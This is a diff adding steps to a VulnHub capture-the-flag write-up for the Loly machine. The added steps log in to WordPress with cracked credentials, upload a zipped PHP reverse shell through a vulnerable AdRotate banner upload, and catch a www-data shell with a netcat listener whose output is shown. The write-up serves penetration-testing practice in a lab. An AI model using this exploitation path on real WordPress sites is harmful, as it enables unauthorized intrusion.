@@ -62,16 +62,39 @@ root@kali: wpscan --url http://192.168.127.135/wordpress/ -e u,ap -U users.txt -
 ![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/1d1936e5-c66d-4d86-8f3b-542c210f700a)
 
 
-now we have valid credentials, `loly:fernando`, we can login to wodpress site
+now we have valid credentials, `loly:fernando`, we can login to wodpress site, but when you want to go to `wp-admin.php` it redirects you to `loly.lc`
 
+so add server ip to `/etc/hosts` and login to wordpress.
 
+### 3.Gaining Shell
 
+Since we do not have access to edit theme pages or upload plugin to wordpress, we used already installed plugins to find any vulnerability
 
+one plugin `AdRotate` is installed on the wordpress and it has vulnerability which you can find online like [here](https://github.com/jephk9/oscp-jewels/blob/main/services/wordpress-plugin-exploits.md)
 
+and it says we can upload a php rev shell into banner, so make a revshell.php file and zip it and upload it to wordpress from here :
 
+![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/35ac68ee-692d-4193-902d-c4fc44646215)
 
+and in the setting you can find where this banner goes :
 
+![image](https://github.com/Git-K3rnel/VulnHub/assets/127470407/2e58fb7a-da58-4485-bfb7-ebda9db0b606)
 
+so navigate to the address and you will get the shell
+
+```bash
+┌root@kali: nc -nvlp 4444                
+listening on [any] 4444 ...
+connect to [192.168.127.128] from (UNKNOWN) [192.168.127.135] 45688
+Linux ubuntu 4.4.0-31-generic #50-Ubuntu SMP Wed Jul 13 00:07:12 UTC 2016 x86_64 x86_64 x86_64 GNU/Linux
+ 04:40:06 up 32 min,  0 users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+/bin/sh: 0: can't access tty; job control turned off
+
+$ id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
 
 
 
